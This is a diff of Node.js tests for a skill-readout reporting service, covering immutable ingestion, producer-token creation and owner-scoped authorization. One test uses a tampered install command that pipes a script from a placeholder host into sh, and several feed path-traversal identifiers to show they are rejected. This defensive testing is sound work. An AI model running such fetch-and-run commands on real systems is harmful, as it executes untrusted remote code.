@@ -13,6 +13,7 @@ import { promisify } from "node:util";
 import { formatSkillForCodex } from "../scripts/codex-skill-format.mjs";
 import {
   DEFAULT_READOUT_HOST,
+  DEFAULT_READOUT_INGESTION_URL,
   READOUT_VIEWER_STATE,
   discoverHomeNetworkAddress,
   ensureReadoutViewer,
@@ -284,6 +285,132 @@ test("an authenticated producer can ingest and retrieve an immutable native skil
   const viewerPost = await fetch(viewer.url, { method: "POST" });
   assert.equal(viewerPost.status, 405);
   assert.equal(viewerPost.headers.get("allow"), "GET, HEAD");
+});
+
+test("authenticated hosted readouts preserve actual user-run commands and key code", async (context) => {
+  const { viewer, ingestion } = await temporaryReadoutIngestion(context);
+  const command = "codex plugin add qs-skills@quickstark --json";
+  const code = '{\n  "name": "qs-skills",\n  "version": "2.6.0"\n}';
+  const response = await submitIngestion(ingestion, nativeIngestionEnvelope({
+    commands: [{
+      title: "Install the published plugin",
+      command,
+      detail: "Run this command in your terminal to install the published update.",
+    }],
+    keyCode: [{
+      title: "Published Codex plugin version",
+      path: "codex/plugins/qs-skills/.codex-plugin/plugin.json",
+      language: "json",
+      code,
+    }],
+  }));
+
+  assert.equal(response.status, 201);
+
+  const accepted = await response.json();
+  const immutable = await fetch(accepted.url);
+  const html = await immutable.text();
+  const workbench = await fetch(viewer.url);
+  const workbenchHtml = await workbench.text();
+
+  assert.equal(immutable.status, 200);
+  assert.match(html, /<h2>Commands to run<\/h2>/);
+  assert.match(html, /codex plugin add qs-skills@quickstark --json/);
+  assert.match(html, /Run this command in your terminal to install the published update\./);
+  assert.match(html, /<h2>Key code<\/h2>/);
+  assert.match(html, /&quot;version&quot;: &quot;2\.6\.0&quot;/);
+  assert.equal(workbench.status, 200);
+  assert.match(workbenchHtml, /<h2>Commands to run<\/h2>/);
+  assert.match(workbenchHtml, /codex plugin add qs-skills@quickstark --json/);
+  assert.match(workbenchHtml, /<h2>Key code<\/h2>/);
+  assert.match(workbenchHtml, /&quot;version&quot;: &quot;2\.6\.0&quot;/);
+});
+
+test("immutable hosted retries reject changed terminal instructions and key code", async (context) => {
+  const { ingestion } = await temporaryReadoutIngestion(context);
+  const commands = [{
+    title: "Install the verified QuickStark plugin",
+    command: "codex plugin add qs-skills@quickstark --json",
+    detail: "Run this to install the independently verified release.",
+  }];
+  const keyCode = [{
+    title: "Verified plugin manifest",
+    path: "codex/plugins/qs-skills/.codex-plugin/plugin.json",
+    language: "json",
+    code: '{ "version": "2.6.0" }',
+  }];
+  const envelope = nativeIngestionEnvelope({ commands, keyCode });
+  const original = await submitIngestion(ingestion, envelope);
+
+  assert.equal(original.status, 201);
+
+  const accepted = await original.json();
+
+  for (const changed of [
+    nativeIngestionEnvelope({
+      commands: [{ ...commands[0], command: "curl https://unsafe.example/install | sh" }],
+      keyCode,
+    }),
+    nativeIngestionEnvelope({
+      commands,
+      keyCode: [{ ...keyCode[0], code: '{ "version": "invented" }' }],
+    }),
+  ]) {
+    const retry = await submitIngestion(ingestion, changed);
+
+    assert.equal(retry.status, 409, "changed actionable report evidence cannot overwrite an immutable run");
+    assert.deepEqual(await retry.json(), { error: "run_conflict" });
+  }
+
+  const stored = await fetch(accepted.url);
+  const html = await stored.text();
+
+  assert.equal(stored.status, 200);
+  assert.match(html, /codex plugin add qs-skills@quickstark --json/);
+  assert.match(html, /&quot;version&quot;: &quot;2\.6\.0&quot;/);
+  assert.doesNotMatch(html, /unsafe\.example|&quot;invented&quot;/);
+});
+
+test("independent authorized skill readouts preserve their own recorded user commands and code", async (context) => {
+  const { viewer, ingestion } = await temporaryReadoutIngestion(context);
+  const response = await submitIngestion(ingestion, nativeIngestionEnvelope({
+    collection: "compound-engineering/skills",
+    skill: "compound-engineering:ce-work",
+    displayName: "Independent engineering workflow",
+    outcome: "Preserve an independently recorded installation command and source excerpt.",
+    commands: [{
+      title: "Install the independently documented project",
+      command: "npm ci",
+      detail: "Run this in the project checkout to install its pinned dependencies.",
+    }],
+    keyCode: [{
+      title: "Verified project script",
+      path: "package.json",
+      language: "json",
+      code: '{ "test": "node --test" }',
+    }],
+  }));
+
+  assert.equal(response.status, 201);
+
+  const accepted = await response.json();
+  const immutable = await fetch(accepted.url);
+  const html = await immutable.text();
+  const workbench = await fetch(viewer.url);
+  const workbenchHtml = await workbench.text();
+
+  assert.equal(immutable.status, 200);
+  assert.match(html, /<h2>Commands to run<\/h2>/);
+  assert.match(html, /<code class="language-bash">npm ci<\/code>/);
+  assert.match(html, /Run this in the project checkout to install its pinned dependencies\./);
+  assert.match(html, /<h2>Key code<\/h2>/);
+  assert.match(html, /&quot;test&quot;: &quot;node --test&quot;/);
+  assert.equal(workbench.status, 200);
+  assert.match(workbenchHtml, /compound-engineering:ce-work/);
+  assert.match(workbenchHtml, /<h2>Commands to run<\/h2>/);
+  assert.match(workbenchHtml, /<code class="language-bash">npm ci<\/code>/);
+  assert.match(workbenchHtml, /<h2>Key code<\/h2>/);
+  assert.match(workbenchHtml, /&quot;test&quot;: &quot;node --test&quot;/);
 });
 
 test("identical skill-readout submissions return the existing immutable report", async (context) => {
@@ -730,10 +857,8 @@ test("a portable publisher safely retries the same immutable skill run", async (
   assert.equal(retry.url, first.url);
 });
 
-test("portable publication stays disabled without an explicit endpoint and project opt-in", async () => {
-  const disabled = await publishSkillReadout(nativeIngestionEnvelope(), {
-    token: "test-only-codex-laptop-credential-1234567890",
-  });
+test("portable publication stays disabled without a private token or when explicitly denied", async () => {
+  const disabled = await publishSkillReadout(nativeIngestionEnvelope());
 
   assert.deepEqual(disabled, { status: "local-only", reason: "publication_not_configured" });
 
@@ -925,6 +1050,115 @@ test("ingestion loads hashed producer grants without storing bearer credentials"
   assert.doesNotMatch(await (await fetch((await accepted.json()).url)).text(), new RegExp(credential));
 });
 
+test("the producer-token utility safely creates distinct per-machine credentials without exposing or replacing existing tokens", async (context) => {
+  const directory = await temporaryReadoutDirectory(context);
+  const credentialsDirectory = await temporaryReadoutDirectory(context);
+  const producersFile = join(directory, "readout-producers.json");
+  const personalToken = "test-only-existing-personal-laptop-token-1234567890";
+  const personalPath = join(credentialsDirectory, "personal-codex-laptop.token");
+  const generator = join(repositoryRoot, "scripts", "qs-readout-producer-token.mjs");
+
+  await writeFile(personalPath, `${personalToken}\n`, {
+    encoding: "utf8",
+    flag: "wx",
+    mode: 0o600,
+  });
+  await writeFile(producersFile, JSON.stringify({
+    version: 1,
+    producers: [{
+      id: "personal-codex-laptop",
+      tokenSha256: createHash("sha256").update(personalToken).digest("hex"),
+      projects: ["*"],
+    }],
+  }, null, 2), { encoding: "utf8", mode: 0o600 });
+
+  const issued = [];
+
+  for (const id of ["openai-codex-laptop", "linux-codex-dev-server"]) {
+    const { stdout, stderr } = await execFileAsync(process.execPath, [
+      generator,
+      "--producer", id,
+      "--credentials-directory", credentialsDirectory,
+      "--producers-file", producersFile,
+      "--json",
+    ]);
+    const result = JSON.parse(stdout);
+    const path = join(credentialsDirectory, `${id}.token`);
+    const token = (await readFile(path, "utf8")).trim();
+
+    assert.equal(result.producer, id);
+    assert.equal(result.credentialPath, path);
+    assert.deepEqual(result.authorizedProjects, ["*"]);
+    assert.match(token, /^[A-Za-z0-9_-]{64}$/);
+    assert.equal((await stat(path)).mode & 0o777, 0o600);
+    assert.doesNotMatch(stdout, new RegExp(token));
+    assert.doesNotMatch(stderr, new RegExp(token));
+
+    issued.push({ id, token });
+  }
+
+  assert.notEqual(issued[0].token, issued[1].token);
+  assert.equal(await readFile(personalPath, "utf8"), `${personalToken}\n`);
+
+  const grants = JSON.parse(await readFile(producersFile, "utf8"));
+
+  assert.equal(grants.version, 1);
+  assert.deepEqual(grants.producers.map(({ id }) => id), [
+    "personal-codex-laptop",
+    "openai-codex-laptop",
+    "linux-codex-dev-server",
+  ]);
+  assert.equal((await stat(producersFile)).mode & 0o777, 0o600);
+
+  for (const { id, token } of issued) {
+    const grant = grants.producers.find((producer) => producer.id === id);
+
+    assert.equal(grant.tokenSha256, createHash("sha256").update(token).digest("hex"));
+    assert.deepEqual(grant.projects, ["*"]);
+    assert.doesNotMatch(await readFile(producersFile, "utf8"), new RegExp(token));
+  }
+});
+
+test("the producer-token utility refuses unsafe or duplicate producer identities without changing credentials", async (context) => {
+  const directory = await temporaryReadoutDirectory(context);
+  const credentialsDirectory = await temporaryReadoutDirectory(context);
+  const producersFile = join(directory, "readout-producers.json");
+  const generator = join(repositoryRoot, "scripts", "qs-readout-producer-token.mjs");
+  const grants = JSON.stringify({
+    version: 1,
+    producers: [{
+      id: "personal-codex-laptop",
+      tokenSha256: createHash("sha256").update("test-only-existing-personal-laptop-token-1234567890").digest("hex"),
+      projects: ["*"],
+    }],
+  }, null, 2);
+
+  await writeFile(producersFile, grants, { encoding: "utf8", mode: 0o600 });
+
+  for (const id of ["../../private", "openai laptop", "personal-codex-laptop"]) {
+    await assert.rejects(execFileAsync(process.execPath, [
+      generator,
+      "--producer", id,
+      "--credentials-directory", credentialsDirectory,
+      "--producers-file", producersFile,
+      "--json",
+    ]), /safe producer identifier|already registered/i);
+  }
+
+  assert.equal(await readFile(producersFile, "utf8"), grants);
+  assert.deepEqual(await readdir(credentialsDirectory), []);
+});
+
+test("the producer-token utility documents safe per-machine credential creation without exposing secrets", async () => {
+  const generator = join(repositoryRoot, "scripts", "qs-readout-producer-token.mjs");
+  const { stdout, stderr } = await execFileAsync(process.execPath, [generator, "--help"]);
+
+  assert.match(stdout, /--producer <(?:safe-machine-id|id)>/);
+  assert.match(stdout, /SHA-256 digest/);
+  assert.match(stdout, /never prints the token/i);
+  assert.equal(stderr, "");
+});
+
 test("the portable publisher refuses untrusted remote or malformed ingestion endpoints", async () => {
   for (const endpoint of [
     "http://reports.quickstark.com/api/v1/readouts",
@@ -979,6 +1213,538 @@ test("any harness can publish a structured readout through the portable command"
   assert.doesNotMatch(stderr, new RegExp(secret));
 });
 
+test("owner-scoped reporting discovers and publishes the actual Git repository without per-project configuration", async (context) => {
+  const scopes = ["github.com/quickstark/*", "github.com/quickstarkdemo/*"];
+  const { ingestion, viewer } = await temporaryReadoutIngestion(context, {
+    viewer: { allowedProjects: scopes },
+    ingestion: {
+      allowedProjects: scopes,
+      producers: [{
+        id: "codex-laptop",
+        token: "test-only-codex-laptop-credential-1234567890",
+        projects: scopes,
+      }],
+    },
+  });
+  const localDirectory = await temporaryReadoutDirectory(context);
+  const script = join(repositoryRoot, "scripts", "qs-skill-readout.mjs");
+  const environment = {
+    ...process.env,
+    QS_READOUT_BASE_URL: "http://127.0.0.1:1/",
+    QS_READOUT_INGESTION_URL: new URL("api/v1/readouts", ingestion.url).href,
+    QS_READOUT_PRODUCER_ID: "codex-laptop",
+    QS_READOUT_PRODUCER_TOKEN: "test-only-codex-laptop-credential-1234567890",
+    QS_READOUT_PUBLISH_PROJECTS: scopes.join(","),
+    QS_READOUT_PUBLISH_RETRY_DELAY: "0",
+  };
+  const repositories = [
+    ["https://github.com/quickstark/skills.git", "github.com/quickstark/skills"],
+    ["git@github.com:quickstark/marketplace.git", "github.com/quickstark/marketplace"],
+    ["https://github.com/quickstarkdemo/blossy-app.git", "github.com/quickstarkdemo/blossy-app"],
+  ];
+
+  for (const [remote, expectedProject] of repositories) {
+    const cwd = await temporaryGitProject(context, remote);
+    const { stdout } = await execFileAsync(process.execPath, [
+      script,
+      "render",
+      "--data", JSON.stringify({
+        skill: "qs-code-build",
+        outcome: `Publish only the verified current ${expectedProject} repository.`,
+      }),
+      "--directory", localDirectory,
+      "--json",
+    ], { cwd, env: environment });
+    const result = JSON.parse(stdout);
+
+    assert.equal(result.projectIdentity.key, expectedProject);
+    assert.equal(result.projectIdentity.source, "git-origin");
+    assert.equal(result.publication.status, "published");
+    assert.equal(result.publication.project, expectedProject);
+    assert.equal(result.url, result.publication.url);
+    assert.ok(result.publication.url.startsWith(viewer.url));
+    assert.equal(await exists(result.path), true);
+
+    const response = await fetch(result.publication.url);
+
+    assert.equal(response.status, 200);
+    const hosted = await response.text();
+
+    assert.match(hosted, new RegExp(`content="${expectedProject.replaceAll("/", "\\/")}"`));
+    assert.match(hosted, /<meta name="quickstark:harness" content="codex">/);
+  }
+
+  const index = await (await fetch(viewer.url)).text();
+
+  assert.match(index, /quickstark\/skills/);
+  assert.match(index, /quickstark\/marketplace/);
+  assert.match(index, /quickstarkdemo\/blossy-app/);
+});
+
+test("a single reporting token automatically identifies the producer, harness, and any actual project", async (context) => {
+  const { ingestion, viewer } = await temporaryReadoutIngestion(context, {
+    viewer: { allowedProjects: ["*"] },
+    ingestion: {
+      allowedProjects: ["*"],
+      producers: [{
+        id: "codex-laptop",
+        token: "test-only-codex-laptop-credential-1234567890",
+        projects: ["*"],
+      }],
+    },
+  });
+  const localDirectory = await temporaryReadoutDirectory(context);
+  const script = join(repositoryRoot, "scripts", "qs-skill-readout.mjs");
+  const environment = { ...process.env };
+
+  delete environment.QS_READOUT_PUBLISH_PROJECTS;
+  delete environment.QS_READOUT_PRODUCER_ID;
+  delete environment.QS_READOUT_HARNESS;
+
+  Object.assign(environment, {
+    QS_READOUT_BASE_URL: "http://127.0.0.1:1/",
+    QS_READOUT_INGESTION_URL: new URL("api/v1/readouts", ingestion.url).href,
+    QS_READOUT_PRODUCER_TOKEN: "test-only-codex-laptop-credential-1234567890",
+    QS_READOUT_PUBLISH_RETRY_DELAY: "0",
+  });
+
+  for (const [remote, expectedProject] of [
+    ["https://github.com/quickstark/skills.git", "github.com/quickstark/skills"],
+    ["git@github.com:quickstark/marketplace.git", "github.com/quickstark/marketplace"],
+    ["https://github.com/quickstarkdemo/blossy-app.git", "github.com/quickstarkdemo/blossy-app"],
+    ["https://gitlab.com/independent-team/private-tool.git", "gitlab.com/independent-team/private-tool"],
+  ]) {
+    const cwd = await temporaryGitProject(context, remote);
+    const { stdout, stderr } = await execFileAsync(process.execPath, [
+      script,
+      "render",
+      "--data", JSON.stringify({
+        skill: "qs-code-build",
+        outcome: `Automatically report only the actual current ${expectedProject} project.`,
+      }),
+      "--directory", localDirectory,
+      "--json",
+    ], { cwd, env: environment });
+    const result = JSON.parse(stdout);
+
+    assert.equal(result.projectIdentity.key, expectedProject);
+    assert.equal(result.projectIdentity.source, "git-origin");
+    assert.equal(result.publication.status, "published");
+    assert.equal(result.publication.project, expectedProject);
+    assert.equal(result.viewerReused, null);
+    assert.equal(result.url, result.publication.url);
+    assert.ok(result.url.startsWith(viewer.url));
+    assert.equal(await exists(result.path), true);
+    assert.doesNotMatch(stdout, /test-only-codex-laptop-credential/);
+    assert.doesNotMatch(stderr, /test-only-codex-laptop-credential/);
+
+    const response = await fetch(result.url);
+    const hosted = await response.text();
+
+    assert.equal(response.status, 200);
+    assert.match(hosted, new RegExp(`content="${expectedProject.replaceAll("/", "\\/")}"`));
+    assert.match(hosted, /<meta name="quickstark:producer" content="codex-laptop">/);
+    assert.match(hosted, /<meta name="quickstark:harness" content="codex">/);
+  }
+
+  const index = await (await fetch(viewer.url)).text();
+
+  assert.match(index, /quickstark\/skills/);
+  assert.match(index, /quickstark\/marketplace/);
+  assert.match(index, /quickstarkdemo\/blossy-app/);
+  assert.match(index, /independent-team\/private-tool/);
+});
+
+test("one authorized reporting token publishes Git projects without remotes and ordinary local workspaces", async (context) => {
+  const { ingestion, viewer } = await temporaryReadoutIngestion(context, {
+    viewer: { allowedProjects: ["*"] },
+    ingestion: {
+      allowedProjects: ["*"],
+      producers: [{
+        id: "codex-laptop",
+        token: "test-only-codex-laptop-credential-1234567890",
+        projects: ["*"],
+      }],
+    },
+  });
+  const localDirectory = await temporaryReadoutDirectory(context);
+  const script = join(repositoryRoot, "scripts", "qs-skill-readout.mjs");
+  const environment = { ...process.env };
+
+  delete environment.QS_READOUT_PUBLISH_PROJECTS;
+  delete environment.QS_READOUT_PRODUCER_ID;
+  delete environment.QS_READOUT_HARNESS;
+
+  Object.assign(environment, {
+    QS_READOUT_INGESTION_URL: new URL("api/v1/readouts", ingestion.url).href,
+    QS_READOUT_PRODUCER_TOKEN: "test-only-codex-laptop-credential-1234567890",
+    QS_READOUT_PUBLISH_RETRY_DELAY: "0",
+  });
+
+  for (const [cwd, source] of [
+    [await temporaryGitProject(context), "git-root"],
+    [await temporaryReadoutDirectory(context), "workspace"],
+  ]) {
+    const { stdout, stderr } = await execFileAsync(process.execPath, [
+      script,
+      "render",
+      "--data", JSON.stringify({
+        skill: "qs-code-build",
+        outcome: `Publish the actual ${source} using only its authorized token.`,
+      }),
+      "--directory", localDirectory,
+      "--json",
+    ], { cwd, env: environment });
+    const result = JSON.parse(stdout);
+
+    assert.equal(result.projectIdentity.host, "local");
+    assert.equal(result.projectIdentity.source, source);
+    assert.match(result.projectIdentity.key, new RegExp(`^local/${source}/[a-zA-Z0-9._-]+-[a-f0-9]{12}$`));
+    assert.equal(result.publication.status, "published");
+    assert.equal(result.publication.project, result.projectIdentity.key);
+    assert.ok(result.url.startsWith(viewer.url));
+    assert.doesNotMatch(stdout, /test-only-codex-laptop-credential/);
+    assert.doesNotMatch(stderr, /test-only-codex-laptop-credential/);
+
+    const response = await fetch(result.url);
+    const html = await response.text();
+
+    assert.equal(response.status, 200);
+    assert.match(html, /<meta name="quickstark:producer" content="codex-laptop">/);
+    assert.match(html, /<meta name="quickstark:harness" content="codex">/);
+    assert.match(html, new RegExp(`<meta name="quickstark:project-source" content="${source}">`));
+    assert.doesNotMatch(html, new RegExp(cwd.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
+  }
+
+  const index = await (await fetch(viewer.url)).text();
+
+  assert.match(index, /git-root/);
+  assert.match(index, /workspace/);
+});
+
+test("automatic cross-machine publication preserves the originating Git branch, revision, and worktree", async (context) => {
+  const { ingestion, viewer } = await temporaryReadoutIngestion(context, {
+    viewer: { allowedProjects: ["*"] },
+    ingestion: {
+      allowedProjects: ["*"],
+      producers: [{
+        id: "codex-laptop",
+        token: "test-only-codex-laptop-credential-1234567890",
+        projects: ["*"],
+      }],
+    },
+  });
+  const cwd = await temporaryGitProject(
+    context,
+    "https://github.com/quickstarkdemo/reporting-sandbox.git",
+  );
+
+  await execFileAsync("git", ["-C", cwd, "branch", "-M", "feature/observed-client-metadata"]);
+  await writeFile(join(cwd, "README.md"), "Recorded originating checkout.\n", "utf8");
+  await execFileAsync("git", ["-C", cwd, "add", "README.md"]);
+  await execFileAsync("git", [
+    "-C", cwd,
+    "-c", "user.name=QuickStark regression fixture",
+    "-c", "user.email=regression@example.invalid",
+    "commit", "--quiet", "--no-gpg-sign", "-m", "Record originating Git context",
+  ]);
+  await writeFile(join(cwd, "uncommitted-note.txt"), "Observed local worktree change.\n", "utf8");
+
+  const revision = (await execFileAsync("git", ["-C", cwd, "rev-parse", "HEAD"]))
+    .stdout.trim();
+  const localDirectory = await temporaryReadoutDirectory(context);
+  const { stdout } = await execFileAsync(process.execPath, [
+    join(repositoryRoot, "scripts", "qs-skill-readout.mjs"),
+    "render",
+    "--data", JSON.stringify({
+      skill: "qs-test-tdd",
+      outcome: "Preserve independently observed Git evidence across authenticated hosted publication.",
+      nextSkills: [],
+    }),
+    "--directory", localDirectory,
+    "--json",
+  ], {
+    cwd,
+    env: {
+      ...process.env,
+      QS_READOUT_INGESTION_URL: new URL("api/v1/readouts", ingestion.url).href,
+      QS_READOUT_PRODUCER_TOKEN: "test-only-codex-laptop-credential-1234567890",
+      QS_READOUT_PUBLISH_RETRY_DELAY: "0",
+    },
+  });
+  const result = JSON.parse(stdout);
+
+  assert.equal(result.publication.status, "published");
+
+  const local = await readFile(result.path, "utf8");
+  const hosted = await fetch(result.publication.url);
+
+  assert.equal(hosted.status, 200);
+
+  for (const [location, html] of [
+    ["local", local],
+    ["hosted", await hosted.text()],
+  ]) {
+    assert.ok(
+      /<meta name="quickstark:git-branch" content="feature\/observed-client-metadata">/
+        .test(html),
+      `${location} reports preserve the actual originating Git branch`,
+    );
+    assert.ok(
+      new RegExp(`<meta name="quickstark:git-revision" content="${revision}">`).test(html),
+      `${location} reports preserve the actual originating Git revision`,
+    );
+    assert.ok(
+      /<meta name="quickstark:git-dirty-count" content="1">/.test(html),
+      `${location} reports preserve the observed originating worktree state`,
+    );
+    assert.doesNotMatch(
+      html,
+      /<meta name="quickstark:(?:model|total-tokens|reasoning-effort)"/,
+      `${location} reports do not invent unavailable Codex usage telemetry`,
+    );
+  }
+});
+
+test("hosted originating Git evidence rejects unsafe claims and remains immutable across retries", async (context) => {
+  const { ingestion, viewer } = await temporaryReadoutIngestion(context);
+  const observed = {
+    projectKey: "github.com/quickstark/skills",
+    branch: "feature/verified-producer-evidence",
+    revision: "0123456789abcdef0123456789abcdef01234567",
+    ahead: 1,
+    behind: 0,
+    dirtyCount: 2,
+  };
+
+  for (const [description, gitContext] of [
+    ["a different project", { ...observed, projectKey: "github.com/quickstark/marketplace" }],
+    ["an unsafe branch", { ...observed, branch: "../../credentials" }],
+    ["an incomplete revision", { ...observed, revision: "01234567" }],
+    ["a negative upstream count", { ...observed, ahead: -1 }],
+    ["a negative worktree count", { ...observed, dirtyCount: -1 }],
+    ["an unexpected secret field", { ...observed, token: "must-never-be-accepted" }],
+  ]) {
+    const rejected = await submitIngestion(ingestion, nativeIngestionEnvelope({ gitContext }));
+
+    assert.equal(rejected.status, 422, `hosted ingestion rejects ${description}`);
+    assert.deepEqual(await rejected.json(), { error: "invalid_readout" });
+  }
+
+  const envelope = nativeIngestionEnvelope({ gitContext: observed });
+  const first = await submitIngestion(ingestion, envelope);
+
+  assert.equal(first.status, 201);
+
+  const accepted = await first.json();
+  const original = await (await fetch(accepted.url)).text();
+
+  assert.ok(original.includes('content="feature/verified-producer-evidence"'));
+  assert.ok(original.includes('content="0123456789abcdef0123456789abcdef01234567"'));
+
+  const identical = await submitIngestion(ingestion, envelope);
+
+  assert.equal(identical.status, 200);
+
+  const altered = await submitIngestion(ingestion, nativeIngestionEnvelope({
+    gitContext: { ...observed, dirtyCount: 3 },
+  }));
+
+  assert.equal(altered.status, 409, "a changed originating Git observation cannot rewrite history");
+  assert.deepEqual(await altered.json(), { error: "run_conflict" });
+  assert.equal(await (await fetch(accepted.url)).text(), original);
+  assert.ok(accepted.url.startsWith(viewer.url));
+});
+
+test("token-only reporting defaults to the trusted reports API and server-authenticated producer", async (context) => {
+  const { ingestion, viewer } = await temporaryReadoutIngestion(context, {
+    viewer: { allowedProjects: ["*"] },
+    ingestion: {
+      allowedProjects: ["*"],
+      producers: [{
+        id: "codex-laptop",
+        token: "test-only-codex-laptop-credential-1234567890",
+        projects: ["*"],
+      }],
+    },
+  });
+  const cwd = await temporaryGitProject(context, "https://github.com/quickstark/skills.git");
+  const envelope = nativeIngestionEnvelope();
+
+  delete envelope.producer;
+
+  let requestedEndpoint;
+  const result = await publishSkillReadout(envelope, {
+    token: "test-only-codex-laptop-credential-1234567890",
+    cwd,
+    reportBaseUrl: viewer.url,
+    fetcher: async (endpoint, options) => {
+      requestedEndpoint = endpoint.href;
+
+      return fetch(new URL("api/v1/readouts", ingestion.url), options);
+    },
+  });
+
+  assert.equal(DEFAULT_READOUT_INGESTION_URL, "https://reports.quickstark.com/api/v1/readouts");
+  assert.equal(requestedEndpoint, DEFAULT_READOUT_INGESTION_URL);
+  assert.equal(result.status, "published");
+  assert.equal(result.project, "github.com/quickstark/skills");
+  assert.ok(result.url.startsWith(viewer.url));
+
+  const response = await fetch(result.url);
+  const html = await response.text();
+
+  assert.equal(response.status, 200);
+  assert.match(html, /<meta name="quickstark:producer" content="codex-laptop">/);
+});
+
+test("automatic reporting refuses a claimed project outside the actual verified working directory", async (context) => {
+  const { ingestion } = await temporaryReadoutIngestion(context, {
+    viewer: { allowedProjects: ["*"] },
+    ingestion: {
+      allowedProjects: ["*"],
+      producers: [{
+        id: "codex-laptop",
+        token: "test-only-codex-laptop-credential-1234567890",
+        projects: ["*"],
+      }],
+    },
+  });
+  const cwd = await temporaryGitProject(context, "https://github.com/quickstark/skills.git");
+  const noOrigin = await temporaryReadoutDirectory(context);
+  const options = {
+    endpoint: new URL("api/v1/readouts", ingestion.url).href,
+    token: "test-only-codex-laptop-credential-1234567890",
+  };
+
+  assert.deepEqual(await publishSkillReadout(nativeIngestionEnvelope({
+    project: "https://github.com/quickstark/marketplace.git",
+  }), { ...options, cwd }), {
+    status: "local-only",
+    reason: "project_not_authorized",
+  });
+
+  assert.deepEqual(await publishSkillReadout(nativeIngestionEnvelope(), {
+    ...options,
+    cwd: noOrigin,
+  }), {
+    status: "local-only",
+    reason: "project_not_authorized",
+  });
+});
+
+test("owner-scoped publication rejects unrelated owners before disclosing project evidence", async (context) => {
+  const scopes = ["github.com/quickstark/*", "github.com/quickstarkdemo/*"];
+  const { ingestion, viewer } = await temporaryReadoutIngestion(context, {
+    viewer: { allowedProjects: scopes },
+    ingestion: {
+      allowedProjects: scopes,
+      producers: [{
+        id: "codex-laptop",
+        token: "test-only-codex-laptop-credential-1234567890",
+        projects: scopes,
+      }],
+    },
+  });
+
+  for (const project of [
+    "https://github.com/globodai-group/mcp-linkedin-sales-navigator.git",
+    "https://github.com/quickstark-attacker/marketplace.git",
+    "https://gitlab.com/quickstark/marketplace.git",
+    "https://github.com/quickstark/nested/marketplace.git",
+  ]) {
+    const result = await publishSkillReadout(nativeIngestionEnvelope({ project }), {
+      endpoint: new URL("api/v1/readouts", ingestion.url).href,
+      token: "test-only-codex-laptop-credential-1234567890",
+      allowedProjects: scopes,
+    });
+
+    assert.deepEqual(result, {
+      status: "local-only",
+      reason: "project_not_authorized",
+    }, project);
+
+    const response = await submitIngestion(ingestion, nativeIngestionEnvelope({ project }));
+
+    assert.equal(response.status, 403, project);
+    assert.deepEqual(await response.json(), { error: "publication_not_authorized" });
+  }
+
+  assert.doesNotMatch(await (await fetch(viewer.url)).text(), /globodai-group|quickstark-attacker|gitlab\.com|mcp-linkedin/i);
+});
+
+test("owner-scoped readout authorization rejects unsafe and unrestricted project patterns", async (context) => {
+  const directory = await temporaryReadoutDirectory(context);
+
+  for (const scope of [
+    "github.com/*",
+    "github.com/*/*",
+    "github.com/quickstark/**",
+    "github.com/quickstark/*/nested",
+    "github.com/quickstark/../*",
+    "github.com/quickstark/%2e%2e/*",
+    "https://github.com/quickstark/*",
+  ]) {
+    await assert.rejects(startReadoutServer({
+      directory,
+      port: 0,
+      publicationMode: "hosted",
+      allowedProjects: [scope],
+    }), /safe, canonical host\/owner\/(?:repository|project)|safe.*scope/i, scope);
+  }
+});
+
+test("every promoted skill publishes to the authenticated reports API without requiring a local viewer", async (context) => {
+  const { ingestion, viewer } = await temporaryReadoutIngestion(context);
+  const localDirectory = await temporaryReadoutDirectory(context);
+  const script = join(repositoryRoot, "scripts", "qs-skill-readout.mjs");
+  const credential = "test-only-codex-laptop-credential-1234567890";
+  const environment = {
+    ...process.env,
+    QS_READOUT_BASE_URL: "http://127.0.0.1:1/",
+    QS_READOUT_INGESTION_URL: new URL("api/v1/readouts", ingestion.url).href,
+    QS_READOUT_PRODUCER_ID: "codex-laptop",
+    QS_READOUT_PRODUCER_TOKEN: credential,
+    QS_READOUT_PUBLISH_PROJECTS: "github.com/quickstark/skills",
+    QS_READOUT_HARNESS: "codex-desktop",
+    QS_READOUT_PUBLISH_MAX_ATTEMPTS: "2",
+    QS_READOUT_PUBLISH_RETRY_DELAY: "0",
+  };
+
+  for (const skill of SKILLS) {
+    const input = {
+      skill: skill.name,
+      projectIdentity: explicitProject("skills"),
+      outcome: `Publish the actual ${skill.displayName} report without a local viewer.`,
+    };
+    const { stdout, stderr } = await execFileAsync(process.execPath, [
+      script,
+      "render",
+      "--data", JSON.stringify(input),
+      "--directory", localDirectory,
+      "--json",
+    ], {
+      cwd: localDirectory,
+      env: environment,
+    });
+    const result = JSON.parse(stdout);
+
+    assert.equal(result.skill, skill.name, `${skill.name} records the actual native skill`);
+    assert.equal(result.publication.status, "published", `${skill.name} publishes to the authenticated API`);
+    assert.equal(result.viewerReused, null, `${skill.name} does not depend on a local viewer`);
+    assert.ok(result.publication.url.startsWith(viewer.url), `${skill.name} uses the verified hosted viewer`);
+    assert.equal(result.url, result.publication.url, `${skill.name} returns the actual verified hosted report`);
+    assert.equal(await exists(result.path), true, `${skill.name} preserves its immutable local report`);
+    assert.doesNotMatch(stdout, new RegExp(credential), `${skill.name} never prints its private credential`);
+    assert.doesNotMatch(stderr, new RegExp(credential), `${skill.name} never logs its private credential`);
+
+    const response = await fetch(result.publication.url);
+
+    assert.equal(response.status, 200, `${skill.name} exposes its real authenticated-library report`);
+    assert.match(await response.text(), new RegExp(`content="${skill.name}"`));
+  }
+});
+
 test("an explicitly configured native skill render automatically publishes its real local readout", async (context) => {
   const { ingestion, viewer } = await temporaryReadoutIngestion(context);
   const localDirectory = await temporaryReadoutDirectory(context);
@@ -1023,6 +1789,19 @@ test("an explicitly configured native skill render automatically publishes its r
 
 test("the hosted reporting stack isolates authenticated ingestion from its read-only viewer", async () => {
   const compose = await readFile(join(repositoryRoot, "deploy", "readouts", "compose.yaml"), "utf8");
+  const service = (name) => {
+    const match = compose.match(new RegExp(
+      "^  " + name + ":\\n([\\s\\S]*?)(?=^  [a-z0-9-]+:\\n|^networks:)",
+      "m",
+    ));
+
+    assert.ok(match, "Expected the independently isolated " + name + " runtime.");
+
+    return match[0];
+  };
+  const viewer = service("quickstark-readouts");
+  const ingestion = service("quickstark-readout-ingestion");
+  const settings = service("quickstark-readout-settings");
 
   assert.match(compose, /quickstark-readout-ingestion:/);
   assert.match(compose, /QS_READOUT_PUBLIC_URL:\s*https:\/\/reports\.quickstark\.com\/?/);
@@ -1033,7 +1812,13 @@ test("the hosted reporting stack isolates authenticated ingestion from its read-
